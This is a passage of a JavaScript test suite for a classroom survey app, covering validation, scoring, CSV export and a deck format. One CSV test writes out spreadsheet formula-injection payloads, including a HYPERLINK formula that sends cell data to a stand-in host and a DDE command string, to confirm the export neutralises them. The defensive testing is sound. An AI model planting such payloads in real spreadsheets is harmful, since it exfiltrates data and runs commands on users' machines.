/**
 * SurveyAll — logic tests.
 *
 * Zero dependencies. Run with:   node tests/run-tests.mjs
 *
 * These cover the participant flow end to end at the logic level: what a
 * student's tap becomes, whether it's accepted, how it's counted, how it
 * is scored, what lands in the CSV, and — importantly — that no code path
 * produces a student identifier.
 */

import {
  validateResponse, aggregate, normaliseWord, cleanText,
  scoreAnswer, quizLeaderboard, computeDelta,
  buildCSV, toCSVValue, sessionToCSVRows, CSV_HEADERS, payloadToText,
  correctIndices, optionLabels, generateJoinCode, joinURL, joinURLPretty,
  neighbourQuestion, sortedQuestions, MULTI_SUBMIT_TYPES,
  splitPassage, promptKey, isContentSlide, fillJoinPlaceholders, DEFAULT_JOIN_STEPS,
  questionNumber, retypeQuestion, defaultConfig, TYPE_LABELS, promptScale, showSlideLabel, QUESTION_TYPES, CONTENT_TYPES,
  clozeParts, clozeMatches, answerCorrectness,
} from '../app/logic.js';
import { readFileSync, statSync } from 'node:fs';
import { parseDeck, serialiseDeck, SAMPLE_DECK } from '../app/deck-format.js';
import { TEMPLATES } from '../app/templates.js';
import { ambiencePlan, ambienceLevel } from '../app/ambience.js';
import {
  BACKGROUND_PRESETS, CHART_STYLES, THEMES, CUSTOM_FONTS,
  getTheme, auditTheme, contrastRatio, buildCustomTheme, deriveTokens,
} from '../app/themes.js';
import { CHART_ICONS } from '../app/icons.js';
import {
  ELEMENT_LIST, getElement, hasElement, searchElements,
  anchorId, anchorPos, anchorLabel, ANCHORS, RESERVED_ZONES, reservedAt,
  coord, readPos, posName, posLabel, LAYERS, layerId, DEFAULT_LAYER,
  sizeId, colorId, colorValue, weightValue, rotValue, opacityValue,
  normaliseDecor, decorOf, MAX_DECOR, SIZES, COLOR_TOKENS, WEIGHTS,
} from '../app/elements.js';
import {
  Spring, SpringGroup, PRESETS, stagger, easeOutExpo, easeOutCubic,
  toRGB, rgba, mixColor, luminance, readableOn, harmonicSeries, hueWheel,
  srgbToOklab, oklabToSrgb,
} from '../app/motion.js';

// The motion engine schedules through requestAnimationFrame. Node has no
// such thing, so stub it: the stub registers nothing and fires nothing,
// and the spring tests drive frames by hand via group.stepAll(dt). That
// keeps the timing deterministic rather than wall-clock dependent.
if (typeof globalThis.requestAnimationFrame !== 'function') {
  globalThis.requestAnimationFrame = () => 0;
  globalThis.cancelAnimationFrame = () => {};
}

// ---------------------------------------------------------------- tiny harness

let passed = 0;
let failed = 0;
const failures = [];
let group = '';

function describe(name, fn) { group = name; fn(); }

function it(name, fn) {
  try {
    fn();
    passed += 1;
    process.stdout.write('.');
  } catch (err) {
    failed += 1;
    failures.push({ group, name, err });
    process.stdout.write('F');
  }
}

function eq(actual, expected, msg) {
  const a = JSON.stringify(actual);
  const b = JSON.stringify(expected);
  if (a !== b) throw new Error(`${msg || 'not equal'}\n    expected: ${b}\n    actual:   ${a}`);
}

function ok(v, msg) { if (!v) throw new Error(msg || `expected truthy, got ${JSON.stringify(v)}`); }
function notOk(v, msg) { if (v) throw new Error(msg || `expected falsy, got ${JSON.stringify(v)}`); }
function close(a, b, tol, msg) {
  if (Math.abs(a - b) > (tol ?? 1e-9)) throw new Error(`${msg || 'not close'}: ${a} vs ${b}`);
}

// =====================================================================
describe('normalisation', () => {
  it('lowercases so Zombie and zombie merge', () => {
    eq(normaliseWord('Zombie'), 'zombie');
    eq(normaliseWord('ZOMBIE'), 'zombie');
  });

  it('strips edge punctuation but keeps inner apostrophes', () => {
    eq(normaliseWord('  "hope!" '), 'hope');
    eq(normaliseWord("don't."), "don't");
    eq(normaliseWord('#anxious'), '#anxious');
  });

  it('collapses inner whitespace', () => {
    eq(normaliseWord('  really   tired '), 'really tired');
  });

  it('survives non-strings', () => {
    eq(normaliseWord(null), '');
    eq(normaliseWord(42), '');
    eq(cleanText(undefined), '');
  });

  it('truncates text to the configured limit', () => {
    eq(cleanText('x'.repeat(300), 200).length, 200);
  });
});

// =====================================================================
describe('participant flow — multiple choice', () => {
  const cfg = { options: ['Never', 'Once', 'Twice'] };

  it('accepts a single valid choice', () => {
    const r = validateResponse('multiple_choice', cfg, { choices: [1] });
    ok(r.ok);
    eq(r.payload, { choices: [1] });
  });

  it('rejects an empty submission with a usable message', () => {
    const r = validateResponse('multiple_choice', cfg, { choices: [] });
    notOk(r.ok);
    ok(/pick an option/i.test(r.error), 'error should tell the student what to do');
  });

  it('drops out-of-range indices rather than trusting the client', () => {
    const r = validateResponse('multiple_choice', cfg, { choices: [99, -3, 0] });
    ok(r.ok);
    eq(r.payload, { choices: [0] });
  });

  it('rejects several choices when multi-select is off', () => {
    const r = validateResponse('multiple_choice', cfg, { choices: [0, 2] });
    notOk(r.ok);
  });

  it('accepts several when multi-select is on, deduped and sorted', () => {
    const r = validateResponse('multiple_choice',
      { ...cfg, multiple: true }, { choices: [2, 0, 2] });
    ok(r.ok);
    eq(r.payload, { choices: [0, 2] });
  });

  it('honours max_choices', () => {
    const r = validateResponse('multiple_choice',
      { ...cfg, multiple: true, max_choices: 1 }, { choices: [0, 1] });
    notOk(r.ok);
    ok(/at most 1/.test(r.error));
  });

  it('handles a garbage payload without throwing', () => {
    notOk(validateResponse('multiple_choice', cfg, null).ok);
    notOk(validateResponse('multiple_choice', cfg, { choices: 'nope' }).ok);
  });
});

describe('participant flow — word cloud', () => {
  it('normalises and dedupes within one submission', () => {
    const r = validateResponse('word_cloud', { max_words: 3 },
      { words: ['Tired', 'tired', ' Curious '] });
    ok(r.ok);
    eq(r.payload, { words: ['tired', 'curious'] });
  });

  it('rejects blank input', () => {
    notOk(validateResponse('word_cloud', { max_words: 2 }, { words: ['   ', ''] }).ok);
  });

  it('enforces the word cap', () => {
    const r = validateResponse('word_cloud', { max_words: 1 }, { words: ['a', 'b'] });
    notOk(r.ok);
  });

  it('truncates over-long words to max_length', () => {
    const r = validateResponse('word_cloud',
      { max_words: 1, max_length: 5 }, { words: ['abcdefghij'] });
    ok(r.ok);
    eq(r.payload.words[0], 'abcde');
  });
});

describe('participant flow — open ended', () => {
  it('accepts and trims text', () => {
    const r = validateResponse('open_ended', { max_length: 200 }, { text: '  I liked it  ' });
    ok(r.ok);
    eq(r.payload, { text: 'I liked it' });
  });

  it('rejects whitespace-only text', () => {
    notOk(validateResponse('open_ended', {}, { text: '    ' }).ok);
  });

  it('truncates rather than rejecting long text', () => {
    const r = validateResponse('open_ended', { max_length: 20 }, { text: 'y'.repeat(50) });
    ok(r.ok);
    eq(r.payload.text.length, 20);
  });
});

describe('participant flow — scales', () => {
  const cfg = { statements: ['A', 'B'], min: 1, max: 5 };

  it('accepts a complete rating', () => {
    const r = validateResponse('scales', cfg, { values: [3, 5] });
    ok(r.ok);
    eq(r.payload, { values: [3, 5] });
  });

  it('clamps values outside the range', () => {
    const r = validateResponse('scales', cfg, { values: [99, -4] });
    ok(r.ok);
    eq(r.payload, { values: [5, 1] });
  });

  it('rejects a partial rating when skipping is off', () => {
    notOk(validateResponse('scales', cfg, { values: [3, null] }).ok);
  });

  it('allows a partial rating when skipping is on', () => {
    const r = validateResponse('scales', { ...cfg, allow_skip: true }, { values: [3, null] });
    ok(r.ok);
    eq(r.payload, { values: [3, null] });
  });

  it('rejects a fully empty rating even when skipping is on', () => {
    notOk(validateResponse('scales', { ...cfg, allow_skip: true }, { values: [null, null] }).ok);
  });
});

describe('participant flow — ranking', () => {
  const cfg = { items: ['X', 'Y', 'Z'] };

  it('accepts a full ranking', () => {
    const r = validateResponse('ranking', cfg, { order: [2, 0, 1] });
    ok(r.ok);
    eq(r.payload, { order: [2, 0, 1] });
  });

  it('removes duplicates the UI should not have produced', () => {
    const r = validateResponse('ranking', { ...cfg, allow_partial: true },
      { order: [1, 1, 0] });
    ok(r.ok);
    eq(r.payload, { order: [1, 0] });
  });

  it('rejects a partial ranking unless allowed', () => {
    notOk(validateResponse('ranking', cfg, { order: [0] }).ok);
    ok(validateResponse('ranking', { ...cfg, allow_partial: true }, { order: [0] }).ok);
  });
});

describe('participant flow — quiz', () => {
  const cfg = { options: ['A', 'B', 'C'], correct: [1], time: 20 };

  it('accepts a choice and keeps the response time', () => {
    const r = validateResponse('quiz', cfg, { choice: 1, ms: 4200 });
    ok(r.ok);
    eq(r.payload, { choice: 1, ms: 4200 });
  });

  it('rejects no answer', () => {
    notOk(validateResponse('quiz', cfg, {}).ok);
    notOk(validateResponse('quiz', cfg, { choice: 9 }).ok);
  });

  it('tolerates a missing timestamp', () => {
    const r = validateResponse('quiz', cfg, { choice: 0 });
    ok(r.ok);
    eq(r.payload.ms, null);
  });

  it('knows which types allow repeat submissions', () => {
    ok(MULTI_SUBMIT_TYPES.has('word_cloud'));
    ok(MULTI_SUBMIT_TYPES.has('open_ended'));
    notOk(MULTI_SUBMIT_TYPES.has('multiple_choice'));
    notOk(MULTI_SUBMIT_TYPES.has('quiz'));
  });
});

describe('participant flow — unknown input', () => {
  it('refuses an unknown question type instead of crashing', () => {
    const r = validateResponse('telepathy', {}, {});
    notOk(r.ok);
    ok(/unknown/i.test(r.error));
  });

  it('routes Q&A away from the response path', () => {
    notOk(validateResponse('qa', {}, { text: 'hi' }).ok);
  });
});

// =====================================================================
describe('aggregation', () => {
  it('counts multiple choice and computes percentages', () => {
    const agg = aggregate('multiple_choice', { options: ['A', 'B'] }, [
      { payload: { choices: [0] } },
      { payload: { choices: [0] } },
      { payload: { choices: [1] } },
    ]);
    eq(agg.total, 3);
    eq(agg.options[0].count, 2);
    close(agg.options[0].pct, 66.666, 0.01);
  });

  it('counts each respondent once even with multi-select', () => {
    const agg = aggregate('multiple_choice', { options: ['A', 'B'], multiple: true }, [
      { payload: { choices: [0, 1] } },
    ]);
    eq(agg.total, 1, 'one person answered');
    eq(agg.options[0].count, 1);
    eq(agg.options[1].count, 1);
  });

  it('tallies a word cloud by frequency, case-insensitively', () => {
    const agg = aggregate('word_cloud', {}, [
      { payload: { words: ['tired'] } },
      { payload: { words: ['Tired'] } },
      { payload: { words: ['ready'] } },
    ]);
    eq(agg.words[0], { word: 'tired', count: 2 });
    eq(agg.distinct, 2);
    eq(agg.total, 3);
  });

  it('averages scales and excludes skipped statements', () => {
    const agg = aggregate('scales', { statements: ['A', 'B'], min: 1, max: 5 }, [
      { payload: { values: [4, null] } },
      { payload: { values: [2, 5] } },
    ]);
    eq(agg.statements[0].avg, 3);
    eq(agg.statements[0].count, 2);
    eq(agg.statements[1].avg, 5, 'the skip must not drag the average to 2.5');
    eq(agg.statements[1].count, 1);
  });

  it('leaves an unanswered statement average as null, not zero', () => {
    const agg = aggregate('scales', { statements: ['A'], min: 1, max: 5 }, []);
    eq(agg.statements[0].avg, null);
  });

  it('applies Borda counting to rankings', () => {
    // 3 items: 1st = 3pts, 2nd = 2, 3rd = 1
    const agg = aggregate('ranking', { items: ['X', 'Y', 'Z'] }, [
      { payload: { order: [0, 1, 2] } },
      { payload: { order: [0, 2, 1] } },
    ]);
    eq(agg.items[0].label, 'X');
    eq(agg.items[0].points, 6);
    eq(agg.items[0].rank, 1);
    eq(agg.total, 2);
  });

  it('gives unranked items zero points', () => {
    const agg = aggregate('ranking', { items: ['X', 'Y'] }, [{ payload: { order: [0] } }]);
    eq(agg.items.find((i) => i.label === 'Y').points, 0);
  });

  it('collects open-ended entries in order', () => {
    const agg = aggregate('open_ended', {}, [
      { payload: { text: 'first' } }, { payload: { text: 'second' } },
    ]);
    eq(agg.total, 2);
    eq(agg.entries[1].text, 'second');
  });

  it('returns a safe empty shape for no responses', () => {
    const agg = aggregate('multiple_choice', { options: ['A'] }, []);
    eq(agg.total, 0);
    eq(agg.options[0].pct, 0);
  });
});

// =====================================================================
describe('quiz scoring', () => {
  const cfg = { options: ['A', 'B'], correct: [1], time: 20 };

  it('gives no points for a wrong answer', () => {
    eq(scoreAnswer({ choice: 0, ms: 100 }, cfg), 0);
  });

  it('gives close to full marks for an instant correct answer', () => {
    eq(scoreAnswer({ choice: 1, ms: 0 }, cfg), 1000);
  });

  it('decays toward the floor as time runs out', () => {
    eq(scoreAnswer({ choice: 1, ms: 20000 }, cfg), 500);
    eq(scoreAnswer({ choice: 1, ms: 10000 }, cfg), 750);
  });

  it('never drops below the floor for a late correct answer', () => {
    eq(scoreAnswer({ choice: 1, ms: 999999 }, cfg), 500);
  });

  it('supports flat scoring', () => {
    eq(scoreAnswer({ choice: 1, ms: 19000 }, { ...cfg, scoring: 'fixed' }), 1000);
  });

  it('treats a missing time as the full duration', () => {
    eq(scoreAnswer({ choice: 1 }, cfg), 500);
  });

  it('reads correct answers flagged on option objects', () => {
    eq(correctIndices({ options: [{ label: 'A' }, { label: 'B', correct: true }] }), [1]);
    eq(correctIndices({ correct: 2 }), [2]);
    eq(correctIndices({}), []);
  });

  it('builds a leaderboard from pseudonyms only', () => {
    const question = { type: 'quiz', config: cfg };
    const board = quizLeaderboard([{
      question,
      rows: [
        { pseudonym: 'Amber Falcon', payload: { choice: 1, ms: 0 } },
        { pseudonym: 'Teal Harbor', payload: { choice: 1, ms: 20000 } },
        { pseudonym: 'Jade Pike', payload: { choice: 0, ms: 10 } },
      ],
    }]);
    eq(board[0].pseudonym, 'Amber Falcon');
    eq(board[0].score, 1000);
    eq(board[1].pseudonym, 'Teal Harbor');
    eq(board[2].score, 0);
    eq(board.map((b) => b.rank), [1, 2, 3]);

    // FERPA: nothing but the random label should ever appear here.
    const keys = new Set(board.flatMap((b) => Object.keys(b)));
    eq([...keys].sort(), ['answered', 'correct', 'pseudonym', 'rank', 'score']);
  });

  it('sums a leaderboard across several quiz questions', () => {
    const q = { type: 'quiz', config: cfg };
    const board = quizLeaderboard([
      { question: q, rows: [{ pseudonym: 'A', payload: { choice: 1, ms: 0 } }] },
      { question: q, rows: [{ pseudonym: 'A', payload: { choice: 1, ms: 0 } }] },
    ]);
    eq(board[0].score, 2000);
    eq(board[0].correct, 2);
  });

  it('ignores non-quiz questions', () => {
    eq(quizLeaderboard([{ question: { type: 'multiple_choice' }, rows: [{ pseudonym: 'A', payload: {} }] }]), []);
  });
});

// =====================================================================
describe('re-ask delta (P1)', () => {
  const cfg = { options: ['Yes', 'No'] };

  it('reports the swing between two rounds', () => {
    const before = aggregate('multiple_choice', cfg, [
      { payload: { choices: [0] } }, { payload: { choices: [1] } },
      { payload: { choices: [1] } }, { payload: { choices: [1] } },
    ]); // 25% / 75%
    const after = aggregate('multiple_choice', cfg, [
      { payload: { choices: [0] } }, { payload: { choices: [0] } },
      { payload: { choices: [0] } }, { payload: { choices: [1] } },
    ]); // 75% / 25%

    const d = computeDelta(before, after);
    close(d.options[0].deltaPct, 50, 0.001);
    close(d.options[1].deltaPct, -50, 0.001);
    close(d.moved, 50, 0.001, 'half the room changed its mind');
  });

  it('handles scales deltas', () => {
    const cfgS = { statements: ['A'], min: 1, max: 5 };
    const d = computeDelta(
      aggregate('scales', cfgS, [{ payload: { values: [2] } }]),
      aggregate('scales', cfgS, [{ payload: { values: [4] } }]));
    eq(d.statements[0].deltaAvg, 2);
  });

  it('returns null for mismatched or missing rounds', () => {
    eq(computeDelta(null, null), null);
    eq(computeDelta(
      aggregate('multiple_choice', cfg, []),
      aggregate('word_cloud', {}, [])), null);
  });
});

// =====================================================================
describe('CSV export (P5)', () => {
  it('escapes quotes, commas and newlines', () => {
    eq(toCSVValue('plain'), 'plain');
    eq(toCSVValue('a,b'), '"a,b"');
    eq(toCSVValue('say "hi"'), '"say ""hi"""');
    eq(toCSVValue('two\nlines'), '"two\nlines"');
    eq(toCSVValue(null), '');
  });

  it('builds a header row and CRLF line endings', () => {
    const csv = buildCSV([{ a: 1, b: 2 }], ['a', 'b']);
    eq(csv, 'a,b\r\n1,2');
  });

  it('renders each payload type as readable text', () => {
    eq(payloadToText('multiple_choice', { options: ['A', 'B'] }, { choices: [0, 1] }), 'A | B');
    eq(payloadToText('word_cloud', {}, { words: ['x', 'y'] }), 'x | y');
    eq(payloadToText('scales', { statements: ['S1'] }, { values: [4] }), 'S1=4');
    eq(payloadToText('ranking', { items: ['X', 'Y'] }, { order: [1, 0] }), '1. Y | 2. X');
    eq(payloadToText('quiz', { options: ['A', 'B'] }, { choice: 1 }), 'B');
  });

  it('exports a session with no identifying column', () => {
    const session = { label: 'Tue 9am', join_code: 'ABC123' };
    const questions = [
      { id: 'q1', position: 0, type: 'multiple_choice', prompt: 'Pick', config: { options: ['A', 'B'] } },
      { id: 'q2', position: 1, type: 'quiz', prompt: 'Quiz', config: { options: ['A', 'B'], correct: [1], time: 20 } },
    ];
    const responses = [
      { question_id: 'q1', round: 1, pseudonym: 'Amber Falcon', payload: { choices: [1] }, created_at: 't1' },
      { question_id: 'q2', round: 1, pseudonym: 'Amber Falcon', payload: { choice: 1, ms: 0 }, created_at: 't2' },
      { question_id: 'q2', round: 1, pseudonym: 'Teal Harbor', payload: { choice: 0, ms: 0 }, created_at: 't3' },
    ];

    const rows = sessionToCSVRows(session, questions, responses);
    eq(rows.length, 3);

    // sorted by question, then round, then respondent
    eq(rows[0].question_number, 1);
    eq(rows[1].respondent, 'Amber Falcon');
    eq(rows[1].correct, 'yes');
    eq(rows[1].points, 1000);
    eq(rows[2].correct, 'no');
    eq(rows[2].points, 0);

    // FERPA: the header set is fixed and contains nothing identifying
    const banned = ['name', 'email', 'student', 'id', 'ip', 'device', 'user'];
    for (const header of CSV_HEADERS) {
      for (const word of banned) {
        ok(!header.toLowerCase().split('_').includes(word),
          `CSV header "${header}" must not contain "${word}"`);
      }
    }
    eq(Object.keys(rows[0]).sort(), [...CSV_HEADERS].sort());
  });

  it('skips responses whose question was deleted', () => {
    const rows = sessionToCSVRows({}, [], [{ question_id: 'gone', payload: {} }]);
    eq(rows.length, 0);
  });

  // The export exists to be opened in Excel, and an open-ended answer is
  // a box a student types anything into. Quoting does not stop a formula:
  // the quotes come off before the cell is evaluated.
  it('neutralises cells a spreadsheet would run as a formula', () => {
    const attack = '=HYPERLINK("http://evil.test?x="&A1,"Grades")';
    const cell = toCSVValue(attack);
    ok(cell.startsWith("\"'="), `formula cell must be text-guarded, got ${cell}`);
    // the answer itself is still there, just inert
    ok(cell.includes('evil.test'));

    for (const s of ['=1+1', '+1+1', '-1+cmd|\' /c calc\'!A0', '@SUM(A1)', '\tcmd']) {
      ok(toCSVValue(s).replace(/^"/, '').startsWith("'"), `must guard ${JSON.stringify(s)}`);
    }
  });

  it('leaves ordinary values — including negative numbers — untouched', () => {
    eq(toCSVValue('-3'), '-3');
    eq(toCSVValue('-12.5'), '-12.5');
    eq(toCSVValue(-7), '-7');
    eq(toCSVValue('plain'), 'plain');
    eq(toCSVValue('a,b'), '"a,b"');
    eq(toCSVValue('say "hi"'), '"say ""hi"""');
    eq(buildCSV([{ a: '=cmd', b: 'ok' }], ['a', 'b']), "a,b\r\n'=cmd,ok");
  });

  it('numbers questions the way the room was numbered', () => {
    // a deck opening with an instructions slide: the projector and every
    // phone said "Question 1 of 2" for q1, so the CSV must say 1 as well
    const questions = [
      { id: 'i1', position: 0, type: 'instructions', prompt: 'How to join', config: { steps: ['a'] } },
      { id: 'q1', position: 1, type: 'multiple_choice', prompt: 'Pick', config: { options: ['A', 'B'] } },
      { id: 'q2', position: 2, type: 'open_ended', prompt: 'Say', config: {} },
    ];
    const responses = [
      { question_id: 'q1', round: 1, pseudonym: 'Amber Falcon', payload: { choices: [0] } },
      { question_id: 'q2', round: 1, pseudonym: 'Amber Falcon', payload: { text: 'hi' } },
    ];
    const rows = sessionToCSVRows({ label: 'S' }, questions, responses);
    eq(rows.map((r) => r.question_number), [1, 2]);
    // and it agrees with what the room was actually told
    eq(rows[0].question_number, questionNumber(questions, 'q1').number);
    eq(rows[1].question_number, questionNumber(questions, 'q2').number);
  });
});

// =====================================================================
describe('join codes and navigation', () => {
  it('avoids vowels and lookalike characters', () => {
    for (let i = 0; i < 400; i += 1) {
      const code = generateJoinCode(6);
      eq(code.length, 6);
      ok(!/[AEIOU01ILO]/.test(code), `code ${code} contains a confusable/vowel character`);
    }
  });

  it('is deterministic with an injected random source', () => {
    eq(generateJoinCode(4, () => 0), '2222');
  });

  it('builds a join URL that lands straight on the response screen', () => {
    eq(joinURL('https://x.github.io/surveyall/', 'ABC123'),
      'https://x.github.io/surveyall/join#ABC123');
  });

  // The room is told one address. What the QR encodes and what the
  // projector prints have to be the same string, minus the parts nobody
  // types — printing a bare host while the QR went to /join is exactly
  // the drift this pins down.
  it('prints the join link the same way it encodes it', () => {
    eq(joinURLPretty('https://surveyall.org', 'ABC123'), 'surveyall.org/join');
    eq(joinURLPretty('https://x.github.io/surveyall/', 'ABC123'),
      'x.github.io/surveyall/join');
  });

  it('walks questions in position order regardless of input order', () => {
    const qs = [{ id: 'b', position: 1 }, { id: 'a', position: 0 }, { id: 'c', position: 2 }];
    eq(sortedQuestions(qs).map((q) => q.id), ['a', 'b', 'c']);
    eq(neighbourQuestion(qs, 'a', 1).id, 'b');
    eq(neighbourQuestion(qs, 'b', -1).id, 'a');
    eq(neighbourQuestion(qs, 'c', 1), null, 'no wrap past the end');
    eq(neighbourQuestion(qs, 'a', -1), null, 'no wrap before the start');
    eq(neighbourQuestion(qs, 'missing', 1).id, 'a', 'unknown id starts at the top');
    eq(neighbourQuestion([], 'x', 1), null);
  });
});

// =====================================================================
describe('plain-text deck format (P3)', () => {
  it('parses the shipped sample without errors', () => {
    const deck = parseDeck(SAMPLE_DECK);
    eq(deck.errors, []);
    eq(deck.title, 'Sample deck — first day of class');
    eq(deck.theme, 'lecture-hall');
    eq(deck.background, { kind: 'preset', id: 'gradient-dusk' });
    eq(deck.questions.length, 8);
    eq(deck.questions.map((q) => q.type), [
      'instructions', 'word_cloud', 'multiple_choice', 'scales', 'quiz',
      'ranking', 'open_ended', 'qa',
    ]);
    // the opening slide carries its own steps and shows the join card
    eq(deck.questions[0].config.steps.length, 3);
    eq(deck.questions[0].config.show_join, true);
  });

  it('reads a quiz answer key from checkbox syntax', () => {
    const deck = parseDeck(`## quiz (25s)
Who wrote it?
- Durkheim
- [x] Weber
- Marx`);
    eq(deck.errors, []);
    const q = deck.questions[0];
    eq(q.config.correct, [1]);
    eq(q.config.time, 25);
    eq(q.config.options, ['Durkheim', 'Weber', 'Marx']);
  });

  it('reads a scale range from the header or a statement', () => {
    const deck = parseDeck(`## scales (1..7)
Rate these
~ First
~ Second`);
    eq(deck.questions[0].config.min, 1);
    eq(deck.questions[0].config.max, 7);
    eq(deck.questions[0].config.statements, ['First', 'Second']);
  });

  it('reports a quiz with no marked answer', () => {
    const deck = parseDeck(`## quiz
No key here
- A
- B`);
    ok(deck.errors.some((e) => /correct answer/i.test(e)));
  });

  it('reports an unknown question type', () => {
    const deck = parseDeck('## telepathy\nGuess');
    ok(deck.errors.some((e) => /unknown question type/i.test(e)));
  });

  it('reports too few options', () => {
    const deck = parseDeck('## multiple_choice\nPick\n- Only one');
    ok(deck.errors.some((e) => /at least two options/i.test(e)));
  });

  it('reports an empty document', () => {
    ok(parseDeck('').errors.some((e) => /no questions/i.test(e)));
  });

  it('accepts numbered lists for ranking', () => {
    const deck = parseDeck(`## ranking
Rank them
1. Family
2. Media
3. Peers`);
    eq(deck.errors, []);
    eq(deck.questions[0].config.items, ['Family', 'Media', 'Peers']);
  });

  it('ignores comments and blank lines', () => {
    const deck = parseDeck(`# T
// a note

## open_ended
Ask away`);
    eq(deck.errors, []);
    eq(deck.questions.length, 1);
  });

  it('parses background forms', () => {
    eq(parseDeck('# T\nbackground: #ff0000\n## open_ended\nq').background,
      { kind: 'solid', color: '#ff0000' });
    eq(parseDeck('# T\nbackground: dots\n## open_ended\nq').background,
      { kind: 'preset', id: 'dots' });
    eq(parseDeck('# T\nbackground: theme\n## open_ended\nq').background, { kind: 'theme' });
  });

  it('round-trips a deck through serialise → parse unchanged', () => {
    const original = parseDeck(SAMPLE_DECK);
    const text = serialiseDeck(
      { title: original.title, theme: original.theme, background: original.background },
      original.questions);
    const again = parseDeck(text);

    eq(again.errors, []);
    eq(again.title, original.title);
    eq(again.theme, original.theme);
    eq(again.background, original.background);
    eq(again.questions.length, original.questions.length);

    original.questions.forEach((q, i) => {
      eq(again.questions[i].type, q.type, `type of question ${i + 1}`);
      eq(again.questions[i].prompt, q.prompt, `prompt of question ${i + 1}`);
      eq(again.questions[i].config.options, q.config.options, `options of question ${i + 1}`);
      eq(again.questions[i].config.correct, q.config.correct, `answer key of question ${i + 1}`);
      eq(again.questions[i].config.items, q.config.items, `items of question ${i + 1}`);
      eq(again.questions[i].config.statements, q.config.statements, `statements of question ${i + 1}`);
      eq(again.questions[i].config.steps, q.config.steps, `steps of question ${i + 1}`);
    });
  });
});

// =====================================================================
// "Decks are plain text and round-trip" is the headline promise of the
// format, and SAMPLE_DECK alone is far too well-behaved to test it: it
// has no colons in a prompt, no blank options, no "#" prompt. These are
// the cases that were losing an instructor's questions.
describe('the deck format is lossless', () => {
  const reparse = (q, deck = { title: 'Deck', theme: 'lecture-hall' }) =>
    parseDeck(serialiseDeck(deck, [q])).questions[0];

  it('round-trips every prompt in the shipped activity library', () => {
    for (const t of TEMPLATES) {
      const text = serialiseDeck({ title: t.name }, t.questions);
      const again = parseDeck(text);
      eq(again.questions.length, t.questions.length, `${t.id}: question count`);
      t.questions.forEach((q, i) => {
        eq(again.questions[i].type, q.type, `${t.id} q${i + 1}: type`);
        eq(again.questions[i].prompt, q.prompt, `${t.id} q${i + 1}: prompt`);
      });
    }
  });

  it('keeps a prompt that contains a colon', () => {
    // "Weber: what did he mean by rationalisation?" is a question, not a
    // setting called "weber"
    const q = reparse({ type: 'open_ended', prompt: 'Weber: what did he mean by rationalisation?', config: {} });
    eq(q.prompt, 'Weber: what did he mean by rationalisation?');
    notOk('weber' in q.config, 'a colon in a prompt must not become a config key');

    const direct = parseDeck('## open_ended\nEdit me: a question with several defensible answers');
    eq(direct.questions[0].prompt, 'Edit me: a question with several defensible answers');
  });

  it('still reads a real setting written above the prompt', () => {
    const deck = parseDeck(`## word_cloud
max_words: 3
One word for how the reading left you`);
    eq(deck.questions[0].prompt, 'One word for how the reading left you');
    eq(deck.questions[0].config.max_words, 3);
  });

  it('keeps a prompt that starts with "#" and the deck title with it', () => {
    const text = serialiseDeck({ title: 'Week 9' },
      [{ type: 'open_ended', prompt: '#MeToo — was it a turning point?', config: {} }]);
    const again = parseDeck(text);
    eq(again.title, 'Week 9');
    eq(again.questions[0].prompt, '#MeToo — was it a turning point?');
  });

  it('keeps a blank option in place instead of gluing it to the prompt', () => {
    const q = reparse({
      type: 'multiple_choice',
      prompt: 'Which is a social institution?',
      config: { options: ['Marriage', '', 'The economy'] },
    });
    eq(q.prompt, 'Which is a social institution?');
    eq(q.config.options, ['Marriage', '', 'The economy']);
  });

  it('keeps a blank statement, item and step too', () => {
    eq(reparse({ type: 'scales', prompt: 'Rate', config: { statements: ['Clear', ''], min: 1, max: 5 } })
      .config.statements, ['Clear', '']);
    eq(reparse({ type: 'ranking', prompt: 'Rank', config: { items: ['A', '', 'B'] } })
      .config.items, ['A', '', 'B']);
    eq(reparse({ type: 'instructions', prompt: 'Join', config: { steps: ['Scan the code', ''] } })
      .config.steps, ['Scan the code', '']);
    eq(reparse({ type: 'timeline', prompt: 'Order', config: { items: ['', 'Second'] } })
      .config.items, ['', 'Second']);
    eq(reparse({ type: 'budget', prompt: 'Fund', config: { options: ['Libraries', ''], total: 100 } })
      .config.options, ['Libraries', '']);
    eq(reparse({ type: 'exit_ticket', prompt: 'Close', config: { prompts: ['Learned', ''], max_length: 200 } })
      .config.prompts, ['Learned', '']);
  });

  it('does not corrupt a brand-new, not-yet-filled-in slide of any type', () => {
    for (const type of QUESTION_TYPES) {
      const prompt = `Prompt for ${type}`;
      const q = reparse({ type, prompt, config: defaultConfig(type) });
      ok(q, `${type}: slide survives a round-trip`);
      eq(q.type, type, `${type}: type`);
      eq(q.prompt, prompt, `${type}: an empty option must not land in the prompt`);
      for (const key of ['options', 'items', 'statements', 'samples', 'steps', 'prompts', 'pairs']) {
        if (Array.isArray(defaultConfig(type)[key])) {
          eq(q.config[key].length, defaultConfig(type)[key].length, `${type}: ${key} count`);
        }
      }
    }
  });

  it('keeps a heatmap on highlight when it also carries labels', () => {
    const q = reparse({
      type: 'heatmap',
      prompt: 'Mark the passage',
      config: { passage: 'One. | Two.', segments: ['One.', 'Two.'], mode: 'highlight', labels: ['claim', 'evidence'] },
    });
    eq(q.config.mode, 'highlight');
    eq(q.config.labels, ['claim', 'evidence']);
    // labels alone still imply classify, which is the useful default
    eq(parseDeck('## heatmap\nP\n> a | b\nlabels: claim, evidence').questions[0].config.mode, 'classify');
  });

  it('keeps a comma inside a label', () => {
    const q = reparse({
      type: 'heatmap',
      prompt: 'Classify',
      config: { passage: 'a | b', segments: ['a', 'b'], mode: 'classify', labels: ['Claim, unsupported', 'Evidence'] },
    });
    eq(q.config.labels, ['Claim, unsupported', 'Evidence']);
  });

  it('keeps an unset scale anchor unset rather than rating it 0', () => {
    const q = reparse({
      type: 'scales',
      prompt: 'Rate',
      config: { statements: ['S1', 'S2', 'S3'], min: 1, max: 5, anchors: [1, null, 5] },
    });
    // 0 is off the bottom of a 1..5 scale — it would read as an opinion
    // the instructor never gave
    eq(q.config.anchors, [1, null, 5]);
  });

  it('round-trips how hard a photo backdrop is pushed back', () => {
    const bg = { kind: 'image', url: 'https://example.edu/quad.jpg', dim: 0.8, blur: 6 };
    const again = parseDeck(serialiseDeck({ title: 'D', theme: 'lecture-hall', background: bg },
      [{ type: 'qa', prompt: 'Ask', config: {} }]));
    eq(again.background, bg);

    // the default stays implicit, and a non-photo backdrop never carries
    // dim/blur into the ambience engine
    const plain = { kind: 'image', url: 'https://example.edu/quad.jpg', dim: 0.45, blur: 0 };
